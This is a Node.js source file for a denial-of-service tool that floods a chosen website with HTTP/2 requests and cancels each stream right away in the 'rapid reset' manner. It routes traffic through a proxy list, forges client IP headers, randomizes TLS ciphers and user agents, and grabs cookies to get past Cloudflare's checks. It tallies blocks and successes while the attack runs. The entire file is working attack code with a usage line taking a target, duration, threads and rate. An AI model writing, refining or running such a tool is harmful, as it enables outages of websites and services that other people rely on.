const url = require('url'),
    fs = require('fs'),
    http2 = require('http2'),
    http = require('http'),
    tls = require('tls'),
    request = require('request'),
    cluster = require('cluster'),
    fakeua = require('fake-useragent'),
    randstr = require('randomstring');

// Konfigurasi
const config = {
    ciphers: [
        "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", 
        "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
        "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
        "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
        "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
    ],
    acceptHeaders: [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
    ],
    langHeaders: [
        'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
        'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
        'en-US,en;q=0.5',
        'en-US,en;q=0.9',
        'de-CH;q=0.7',
        'da, en-gb;q=0.8, en;q=0.7',
        'cs;q=0.5'
    ],
    encodingHeaders: [
        'deflate, gzip;q=1.0, *;q=0.5',
        'gzip, deflate, br',
        '*'
    ]
};

// Statistics
let stats = {
    requests: 0,
    success: 0,
    blocked: 0,
    errors: 0,
    cfBlocks: 0
};

// Handle errors dengan filter
process.on('uncaughtException', (e) => {
    if (e.code?.includes('ECONN') || e.code?.includes('EPIPE') || e.code?.includes('ETIMEDOUT')) return;
    console.error(`[ERROR] ${e.message}`);
}).on('unhandledRejection', (e) => {
    console.error(`[REJECTION] ${e.message || e}`);
}).setMaxListeners(0);

// Utility functions
const utils = {
    randomChoice: (arr) => arr[Math.floor(Math.random() * arr.length)],
    randomIP: () => {
        const randByte = () => Math.floor(Math.random() * 256);
        let ip;
        do {
            ip = `${randByte()}.${randByte()}.${randByte()}.${randByte()}`;
        } while (/^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip));
        return ip;
    },
    generateCFBypassHeaders: () => {
        return {
            'Accept': utils.randomChoice(config.acceptHeaders),
            'Accept-Encoding': utils.randomChoice(config.encodingHeaders),
            'Accept-Language': utils.randomChoice(config.langHeaders),
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1'
        };
    }
};

// Cloudflare Challenge Solver (Basic)
async function solveCloudflareChallenge(target, proxy) {
    return new Promise((resolve) => {
        const jar = request.jar();
        const headers = {
            'User-Agent': fakeua(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        };

        request.get({
            url: target,
            jar: jar,
            headers: headers,
            proxy: `http://${proxy}`,
            timeout: 10000
        }, (err, response) => {
            if (err) {
                console.error(`[CF SOLVER] Failed: ${err.message}`);
                return resolve('');
            }

            if (response.headers['set-cookie']) {
                const cookies = response.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
                console.log(`[CF SOLVER] Got cookies: ${cookies.substring(0, 50)}...`);
                resolve(cookies);
            } else {
                console.log('[CF SOLVER] No CF challenge detected or no cookies received');
                resolve('');
            }
        });
    });
}

// HTTP/2 Attack dengan RST Stream
async function http2Flood() {
    const target = process.argv[2];
    const duration = process.argv[3] * 1000;
    const threads = process.argv[4];
    const proxies = fs.readFileSync(process.argv[5], 'utf-8').match(/\S+/g) || [];
    const rps = process.argv[6] || 2;

    if (cluster.isMaster) {
        console.log(`🚀 Target: ${target}`);
        console.log(`🧵 Threads: ${threads} | ⏱️ Duration: ${duration}ms`);
        console.log(`📊 RPS: ${rps} | 🔄 Proxies: ${proxies.length}`);
        
        // Stats logger
        setInterval(() => {
            console.log(`📈 Stats: Requests=${stats.requests} | Success=${stats.success} | Blocked=${stats.blocked} | Errors=${stats.errors} | CF_Blocks=${stats.cfBlocks}`);
        }, 5000);

        for (let i = 0; i < threads; i++) {
            cluster.fork();
        }

        setTimeout(() => {
            console.log('✅ Attack finished');
            process.exit();
        }, duration);
    } else {
        const parsed = url.parse(target);
        let cfCookies = '';
        let lastCookieUpdate = 0;

        // Periodic CF cookie refresh
        setInterval(async () => {
            if (proxies.length > 0 && Date.now() - lastCookieUpdate > 60000) {
                const proxy = utils.randomChoice(proxies);
                cfCookies = await solveCloudflareChallenge(target, proxy);
                lastCookieUpdate = Date.now();
            }
        }, 30000);

        async function attack() {
            if (proxies.length === 0) return;

            const proxy = utils.randomChoice(proxies).split(':');
            const randomIP = utils.randomIP();
            
            const headers = {
                ':method': 'GET',
                ':authority': parsed.host,
                ':path': parsed.path || '/',
                ':scheme': 'https',
                'user-agent': fakeua(),
                'x-forwarded-for': randomIP,
                'x-real-ip': randomIP,
                'forwarded': `for=${randomIP}`,
                'cookie': cfCookies,
                ...utils.generateCFBypassHeaders()
            };

            try {
                const req = http.request({
                    host: proxy[0],
                    port: proxy[1],
                    method: 'CONNECT',
                    path: `${parsed.host}:443`,
                    timeout: 10000
                });

                req.on('connect', (res, socket) => {
                    if (res.statusCode !== 200) {
                        console.error(`[PROXY] Connection failed: ${res.statusCode}`);
                        stats.errors++;
                        return;
                    }

                    const tlsSocket = tls.connect({
                        socket: socket,
                        host: parsed.host,
                        ciphers: utils.randomChoice(config.ciphers),
                        servername: parsed.host,
                        rejectUnauthorized: false,
                        ALPNProtocols: ['h2'],
                        secureProtocol: 'TLSv1_2_method'
                    }, () => {
                        const client = http2.connect(parsed.href, {
                            createConnection: () => tlsSocket,
                            settings: {
                                headerTableSize: 65536,
                                enablePush: false,
                                initialWindowSize: 6291456,
                                maxHeaderListSize: 262144
                            }
                        });

                        client.on('error', (err) => {
                            if (!err.code?.includes('ECONN')) {
                                console.error(`[HTTP2] ${err.code}`);
                            }
                            stats.errors++;
                        });

                        // Send multiple requests dengan RST Stream
                        for (let i = 0; i < rps; i++) {
                            try {
                                const stream = client.request(headers);
                                stats.requests++;

                                stream.on('response', (headers) => {
                                    const status = headers[':status'];
                                    
                                    if (status === 200) {
                                        stats.success++;
                                    } else if (status === 503 || status === 403) {
                                        stats.cfBlocks++;
                                        console.error(`[CF] Cloudflare Block: ${status}`);
                                    } else if (status >= 400) {
                                        stats.blocked++;
                                        console.error(`[BLOCKED] Status: ${status}`);
                                    }

                                    // RST Stream setelah menerima response
                                    setTimeout(() => {
                                        try {
                                            stream.close(0x8); // RST_STREAM dengan code CANCEL
                                        } catch (e) {
                                            // Ignore
                                        }
                                    }, Math.random() * 100 + 50);
                                });

                                stream.on('error', (e) => {
                                    if (!e.code?.includes('ERR_')) {
                                        console.error(`[STREAM] ${e.code}`);
                                    }
                                    stats.errors++;
                                });

                                // RST Stream random tanpa menunggu response
                                setTimeout(() => {
                                    try {
                                        if (stream && !stream.closed) {
                                            stream.close(0x8); // CANCEL
                                        }
                                    } catch (e) {
                                        // Ignore
                                    }
                                }, Math.random() * 500 + 200);

                                stream.end();

                            } catch (e) {
                                stats.errors++;
                            }
                        }

                        // Close client setelah delay
                        setTimeout(() => {
                            try {
                                client.close();
                            } catch (e) {
                                // Ignore
                            }
                        }, 5000);
                    });

                    tlsSocket.on('error', (e) => {
                        if (!e.code?.includes('ECONN')) {
                            console.error(`[TLS] ${e.code}`);
                        }
                        stats.errors++;
                    });
                });

                req.on('error', (e) => {
                    console.error(`[PROXY] ${e.message}`);
                    stats.errors++;
                });

                req.on('timeout', () => {
                    console.error('[PROXY] Timeout');
                    req.destroy();
                    stats.errors++;
                });

                req.end();

            } catch (e) {
                console.error(`[GLOBAL] ${e.message}`);
                stats.errors++;
            }
        }

        // Attack interval
        setInterval(attack, 1000);
        
        // Initial attack
        attack();
    }
}

// Start attack
if (process.argv.length < 6) {
    console.log('Usage: node http2.js <target> <duration> <threads> <proxy_file> <rps>');
    process.exit(1);
}

http2Flood().catch(console.error);